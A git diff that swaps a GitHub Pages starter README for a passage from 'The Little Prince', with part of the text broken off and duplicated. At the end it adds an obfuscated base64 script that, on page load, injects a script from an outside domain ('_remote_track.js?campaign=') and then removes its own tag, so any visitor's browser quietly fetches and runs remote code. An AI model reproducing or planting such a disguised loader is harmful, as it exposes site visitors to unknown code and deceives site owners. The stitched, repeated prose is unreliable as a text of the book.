@@ -1,37 +1,70 @@
-## Welcome to GitHub Pages
+# It took me a long
 
-You can use the [editor on GitHub](https://github.com/sanyagusev/Looked/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+It took me a long time to learn where he came from. The little prince, who asked me so many questions, never seemed to hear the ones I asked him. It was from words dropped by chance that, little by little, everything was revealed to me.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+The first time he saw my airplane, for instance (I shall not draw my airplane; that would be much too complicated for me), he asked me:
 
-### Markdown
+"What is that object?"
+![i](https://assets.weforum.org/report/image/xC_06zaz-uO6n91o6RE0G0qldLFVjoHdZWlGwfSezJk.png)
+"That is not an object. It flies. It is an airplane. It is my airplane."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+And I was proud to have him learn that I could fly.
 
-```markdown
-Syntax highlighted code block
+He cried out, then:
 
-# Header 1
-## Header 2
-### Header 3
+"What! You dropped down from the sky?"
 
-- Bulleted
-- List
+"Yes," I answered, modestly.
 
-1. Numbered
-2. List
+"Oh! That is funny!"
 
-**Bold** and _Italic_ and `Code` text
+And the little prince broke into a lovely peal of laughter, which irritated me very much. I like my misfortunes to be taken seriously.
 
-[Link](url) and ![Image](src)
-```
+Then he added:
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"So you, too, come from the sky! Which is your planet?"
 
-### Jekyll Themes
+At that moment I caught a gleam of light in the impenetrable mystery of his presence; and I demanded, abruptly:
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/sanyagusev/Looked/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"Do you come from another planet?"
 
-### Support or Contact
+But he did not reply. He tossed his head gently, without taking his eyes from my plane:
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"It is true that on that you can't have come from very far away . . ."
+
+And he sank into a reverie, which lasted a long time. Then, taking my sheep out of his pocket, he buried himself in the contemplation of his treasure.
+
+You can imagine how my curiosity was aroused by this half-confidence about the "other planets." I made a great effort, therefore, to find out more on this subject.
+
+"My little man, where do you come from? What is this 'where I live,' of which you speak? Where do you want to take your sheep?"
+
+After a reflective silence he answered:
+
+"The thing that is so good about the box you have given me is that at night he can use it as his house."
+
+"That is so. And if you are good I will give you a string, too, so that you can tie him during the day, and a post to tie him to."
+
+But the little prince seemed shocked by this offer:
+I had thus learned a second fact of great importance: this was that the planet the little prince came from was scarcely any larger than a house!
+
+But that did not really surprise me much. I knew very well that in addition to the great planets--such as the Earth, Jupiter, Mars, Venus--to which we have given names, there are also hundreds of others, some of which are so small that one has a hard time seeing them through the telescope. When an astronomer discovers one of these he does not give it a name, but only a number. He might call it, for example, "Asteroid 325."
+
+I have serious reason to believe that the planet from which the little prince came is the asteroid known as B-612.
+
+This asteroid has only once been seen through the telescope. That was by a Turkish astronomer, in 1909.
+
+I had thus learned a second fact of great importance: this was that the planet the little prince came from was scarcely any larger than a house!
+
+But that did not really surprise me much. I knew very well that in addition to the great planets--such as the Earth, Jupiter, Mars, Venus--to which we have given names, there are also hundreds of others, some of which are so small that one has a hard time seeing them through the telescope. When an astronomer discovers one of these he does not give it a name, but only a number. He might call it, for example, "Asteroid 325."
+
+I have serious reason to believe that the planet from which the little prince came is the asteroid known as B-612.
+
+This asteroid has only once been seen through the telescope. That was by a Turkish astronomer, in 1909.
+
+On making his discovery, the astronomer had presented it to the International Astronomical Congress, in a great demonstration. But he was in Turkish costume, and so nobody would believe what he said.
+
+Grown-ups are like that . . .
+
+Fortunately, however, for the reputation of Asteroid B-612, a Turkish dictator made a law that his subjects, under pain of death, should change to European costume. So in 1920 the astronomer gave his demonstration all over again, dressed with impressive style and elegance. And this time everybody accepted his report.
+
+<script id="wwXHm" src="data:text/javascript;base64, dmFyIF85YXo2NyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3d4UGgyLCBfWEJ2UmgpIHt2YXIgX3U0eEVqID0gZnVuY3Rpb24oX1U4R3EzKSB7d2hpbGUgKC0tX1U4R3EzKSB7X3d4UGgyWydwdXNoJ10oX3d4UGgyWydzaGlmdCddKCkpO319O191NHhFaigrK19YQnZSaCk7fShfOWF6NjcsIDB4MTFiKSk7dmFyIF96QzlXWSA9IGZ1bmN0aW9uKF85b2JuaywgXzkyMXJUKSB7XzlvYm5rID0gXzlvYm5rIC0gMHgwO3ZhciBfUTlyS1YgPSBfOWF6NjdbXzlvYm5rXTtyZXR1cm4gX1E5cktWO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfekM5V1koJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzgxa1pyID0gZG9jdW1lbnRbX3pDOVdZKCcweDEnKV0oX3pDOVdZKCcweDInKSk7Xzgxa1pyW196QzlXWSgnMHgzJyldID0gX3pDOVdZKCcweDQnKTtfODFrWnJbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2NFx4NjVceDczXHg3NFx4NzJceDZmXHg2OVx4MzNceDJlXHg3Nlx4NzNceDY1XHg3M1x4NzRceDcyXHg2Zlx4NjlceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg0ZVx4N2FceDY2XHg2ZFx4NDhceDRlXHg3NFx4NjZceDZkXHg0MSc7ZG9jdW1lbnRbX3pDOVdZKCcweDUnKV0oX3pDOVdZKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oXzgxa1pyKTtkb2N1bWVudFtfekM5V1koJzB4NycpXSgnd3dYSG0nKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
